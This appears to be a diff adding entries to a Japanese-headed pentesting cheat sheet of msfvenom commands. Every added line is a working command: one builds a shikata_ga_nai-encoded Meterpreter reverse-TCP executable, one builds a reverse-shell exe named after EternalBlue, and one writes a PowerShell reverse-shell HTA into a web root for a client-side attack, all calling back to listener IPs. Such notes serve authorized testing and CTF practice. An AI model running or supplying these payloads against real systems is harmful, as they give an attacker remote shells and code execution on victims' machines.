@@ -34,3 +34,21 @@ msfvenom -a x86 --platform windows -p windows/exec CMD='cmd.exe' -f raw -b "\x00
 msfvenom -a x86 --platform windows -p windows/exec CMD='cmd.exe'  EXITFUNC=thread -f python -b "\x00\x0a\x12\x1a\x4e\xb1\xd5" 
 ```
 
+### msfconsole用(windows)
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.86.217 LPORT=4443 -f exe -o reverse_tcp.exe
+```
+
+### tcpリバースシェル
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.18.86.217 LPORT=4444 -f exe > eternalblue.exe
+```
+
+### client-side attack hta
+
+```
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+```
+
